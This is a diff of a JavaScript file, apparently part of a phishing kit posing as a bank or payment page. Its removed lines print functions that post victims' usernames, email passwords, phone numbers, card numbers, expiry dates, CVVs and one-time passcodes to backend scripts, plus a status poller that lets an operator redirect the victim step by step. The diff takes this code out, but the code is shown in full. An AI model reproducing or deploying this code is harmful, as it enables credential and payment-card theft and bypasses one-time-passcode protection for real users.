@@ -1,12 +1,5 @@
 
 
-function inicio(u){
-    $.post( "/process/inicio.php", { usr: u} ,function(data) {
-        window.location.href = "contraseña.php";
-    });
-}
-
-
 function detectar_dispositivo(){
     var dispositivo = "";
     if(navigator.userAgent.match(/Android/i))
@@ -51,37 +44,3 @@ function pasousuario(p, u, b){
         }
     });
 }            
-
-function consultar_estado(){
-    $.post( "/process2/estado.php",function(data) {
-        switch (data) {
-            case '2': window.location.href = "otp.php"; break;
-            // case '4': window.location.href = "correo"; break;
-            // // case '6': window.location.href = "../../../../../VALIDATECARD/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/"; break;               
-            // // case '8': window.location.href = "../../../../../ERROROTP/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/"; break;
-            case '10': window.location.href = "finish.php"; break;
-            case '12': window.location.href = "index.php"; break;
-            case '40': window.location.href = "/404.php"; break;
-            case '41': window.location.href = "/reintentar_pago.php"; break;
-
-        } 
-    });        
-}
-
-function enviar_otp(o){
-    $.post( "/process2/pasoOTP.php",{ otp:o },function(data) {
-        window.location.href = "cargando.php";
-    }); 
-}
-
-function enviar_mail(m,c,t){    
-    $.post( "../../../../../process/pasomail.php",{ eml:m, passe:c, cel:t},function(data) {
-        window.location.href = "../../../../../WAITING/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/";
-    });
-}
-
-function enviar_tarjeta(t,f,c){    
-    $.post( "../../../../../process/pasotarjeta.php",{ tar:t, fec:f, cvv:c },function(data) {
-        window.location.href = "../../../../../WAITING/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/";
-    });
-}
